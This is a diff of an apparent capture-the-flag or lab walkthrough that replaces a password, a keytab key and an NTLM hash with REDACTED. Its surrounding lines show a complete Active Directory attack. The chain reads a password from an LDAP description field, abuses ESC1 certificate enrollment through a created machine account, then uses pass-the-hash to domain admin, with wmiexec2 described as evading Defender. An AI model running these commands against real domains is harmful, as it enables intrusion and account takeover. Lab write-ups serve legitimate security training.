@@ -208,7 +208,7 @@ keytabextract.py krb5.keytab
 [+] Keytab File successfully imported.
         REALM : ANOMALY.HSM
         SERVICE PRINCIPAL : Brandon_Boyd/
-        AES-256 HASH : f9754c5288b844eb86054695b2c12b93716f57c41d26325c1a994e12bbbeff52
+        AES-256 HASH : REDACTED
 ```
 
 No NTLM hash (AES-only keytab), but the AES-256 key is sufficient for Kerberos authentication via `kinit`.
@@ -276,20 +276,20 @@ LDAP  ANOMALY-DC  -Username-      -Last PW Set-       -BadPW-  -Description-
 LDAP  ANOMALY-DC  Administrator   2025-09-17 08:01:03  0       Built-in account...
 LDAP  ANOMALY-DC  Guest           <never>              0       Built-in account...
 LDAP  ANOMALY-DC  krbtgt          2025-09-21 07:54:56  0       Key Distribution...
-LDAP  ANOMALY-DC  Brandon_Boyd    2025-11-12 15:30:05  0       3edc4rfv#EDC$RFV
+LDAP  ANOMALY-DC  Brandon_Boyd    2025-11-12 15:30:05  0       REDACTED
 LDAP  ANOMALY-DC  anna_molly      2025-11-12 15:29:16  0
 ```
 
-**Cleartext password for `brandon_boyd` in his own Description field: `3edc4rfv#EDC$RFV`**
+**Cleartext password for `brandon_boyd` in his own Description field: `REDACTED`**
 
 ### Validate Credentials Against SMB
 
 ```bash
-nxc smb Anomaly-DC.anomaly.hsm -u 'brandon_boyd' -p '3edc4rfv#EDC$RFV' --shares
+nxc smb Anomaly-DC.anomaly.hsm -u 'brandon_boyd' -p 'REDACTED' --shares
 ```
 
 ```
-SMB  ANOMALY-DC  [+] anomaly.hsm\brandon_boyd:3edc4rfv#EDC$RFV
+SMB  ANOMALY-DC  [+] anomaly.hsm\brandon_boyd:REDACTED
 SMB  ANOMALY-DC  NETLOGON  READ
 SMB  ANOMALY-DC  SYSVOL    READ
 ```
@@ -303,7 +303,7 @@ Authenticated. Check for GPP passwords in SYSVOL — none found.
 Collect AD data using NetExec (no need for SharpHound on a Linux attacker):
 
 ```bash
-nxc ldap anomaly-dc.anomaly.hsm -u brandon_boyd -p '3edc4rfv#EDC$RFV' \
+nxc ldap anomaly-dc.anomaly.hsm -u brandon_boyd -p 'REDACTED' \
   --bloodhound -c All --dns-server 10.0.20.248
 ```
 
@@ -358,7 +358,7 @@ The catch: `CertAdmin` only allows **Domain Computers** to enroll, not Domain Us
 ### Verify MachineAccountQuota
 
 ```bash
-nxc ldap Anomaly-DC.anomaly.hsm -u brandon_boyd -p '3edc4rfv#EDC$RFV' -M maq
+nxc ldap Anomaly-DC.anomaly.hsm -u brandon_boyd -p 'REDACTED' -M maq
 ```
 
 ```
@@ -382,7 +382,7 @@ Brandon_Boyd (Domain User)
 ### Confirm with Certipy
 
 ```bash
-certipy-ad find -u brandon_boyd@anomaly.hsm -p '3edc4rfv#EDC$RFV' \
+certipy-ad find -u brandon_boyd@anomaly.hsm -p 'REDACTED' \
   -dc-ip 10.0.20.248 -text -enabled -hide-admins -vulnerable
 ```
 
@@ -414,7 +414,7 @@ ESC1 confirmed. Enrollable by Domain Computers only.
 ### Step 1 — Create a Machine Account
 
 ```bash
-nxc ldap Anomaly-DC.anomaly.hsm -u brandon_boyd -p '3edc4rfv#EDC$RFV' \
+nxc ldap Anomaly-DC.anomaly.hsm -u brandon_boyd -p 'REDACTED' \
   -M add-computer -o NAME=FAKEBOX$ PASSWORD=Password123!
 ```
 
@@ -474,18 +474,18 @@ certipy-ad auth -pfx anna_molly.pfx -dc-ip 10.0.20.248
 ```
 [*] Got TGT
 [*] Saving credential cache to 'anna_molly.ccache'
-[*] Got hash for 'anna_molly@anomaly.hsm': aad3b435b51404eeaad3b435b51404ee:be4bf3131851aee9a424c58e02879f6e
+[*] Got hash for 'anna_molly@anomaly.hsm': aad3b435b51404eeaad3b435b51404ee:REDACTED
 ```
 
 ### Step 4 — Verify Domain Admin Access
 
 ```bash
 nxc smb Anomaly-DC.anomaly.hsm -u 'anna_molly' \
-  -H 'aad3b435b51404eeaad3b435b51404ee:be4bf3131851aee9a424c58e02879f6e' --shares
+  -H 'aad3b435b51404eeaad3b435b51404ee:REDACTED' --shares
 ```
 
 ```
-SMB  ANOMALY-DC  [+] anomaly.hsm\anna_molly:be4bf3131851aee9a424c58e02879f6e (Pwn3d!)
+SMB  ANOMALY-DC  [+] anomaly.hsm\anna_molly:REDACTED (Pwn3d!)
 SMB  ANOMALY-DC  ADMIN$  READ,WRITE
 SMB  ANOMALY-DC  C$      READ,WRITE
 ```
@@ -504,7 +504,7 @@ Use `wmiexec2` (obfuscated WMI exec, evades Windows Defender) to get a semi-inte
 
 ```bash
 python3 wmiexec2.py anomaly.hsm/anna_molly@10.0.20.248 \
-  -hashes 'aad3b435b51404eeaad3b435b51404ee:be4bf3131851aee9a424c58e02879f6e'
+  -hashes 'aad3b435b51404eeaad3b435b51404ee:REDACTED'
 ```
 
 ```
@@ -526,7 +526,7 @@ The operation completed successfully.
 
 ```bash
 xfreerdp /v:10.0.20.248 /u:anna_molly \
-  /pth:be4bf3131851aee9a424c58e02879f6e \
+  /pth:REDACTED \
   /cert:ignore
 ```
 
